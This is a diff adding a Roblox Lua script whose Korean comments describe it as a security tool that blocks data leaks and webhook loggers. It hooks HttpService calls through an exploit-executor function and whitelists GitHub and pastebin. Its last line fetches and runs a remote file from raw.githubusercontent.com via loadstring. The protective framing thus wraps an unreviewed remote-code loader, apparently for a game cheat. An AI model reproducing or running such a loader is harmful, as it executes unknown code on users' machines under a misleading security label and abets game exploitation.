@@ -1,0 +1,57 @@
+-- ==========================================================
+-- [보안 패시브] 외부 정보 유출 및 악성 로거 차단 스크립트
+-- ==========================================================
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    
+    -- 안전한 공식 API 및 신뢰할 수 있는 도메인 화이트리스트 설정
+    local AllowedDomains = {
+        "roblox.com",
+        "githubusercontent.com",
+        "github.com",
+        "pastebin.com"
+    }
+
+    -- URL이 안전한 도메인인지 검증하는 함수
+    local function isSafeUrl(url)
+        if not url then return false end
+        local lowerUrl = string.lower(url)
+        
+        -- 디스코드 웹훅(Discord Webhook)을 통한 로그 전송은 무조건 차단
+        if string.find(lowerUrl, "discord.com/api/webhooks") or string.find(lowerUrl, "hooks.slack.com") then
+            return false
+        end
+        
+        -- 화이트리스트 도메인 포함 여부 확인
+        for _, domain in pairs(AllowedDomains) do
+            if string.find(lowerUrl, domain) then
+                return true
+            end
+        end
+        return false
+    end
+
+    -- HttpService의 핵심 전송 메소드(PostAsync, RequestAsync 등)를 변조(Hooking)하여 차단
+    local oldPostAsync
+    oldPostAsync = hookfunction(HttpService.PostAsync, function(self, url, data, ...)
+        if not isSafeUrl(url) then
+            warn("[보안 경고] 허가되지 않은 도메인으로의 데이터 전송이 차단되었습니다: " .. tostring(url))
+            return nil -- 전송을 수행하지 않고 빈 값 반환
+        end
+        return oldPostAsync(self, url, data, ...)
+    end)
+
+    local oldRequestAsync
+    oldRequestAsync = hookfunction(HttpService.RequestAsync, function(self, requestOptions, ...)
+        if requestOptions and requestOptions.Url then
+            if not isSafeUrl(requestOptions.Url) then
+                warn("[보안 경고] 허가되지 않은 도메인으로의 HTTP 요청이 차단되었습니다: " .. tostring(requestOptions.Url))
+                return {StatusCode = 403, Body = "Blocked by Security Script", Success = false}
+            end
+        end
+        return oldRequestAsync(self, requestOptions, ...)
+    end)
+
+    print("[Security Master] 악성 로거 및 웹훅 차단 엔진이 활성화되었습니다.")
+end)
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/yunjunsfdg-a11y/12345/main/papacaca-4.txt"))()
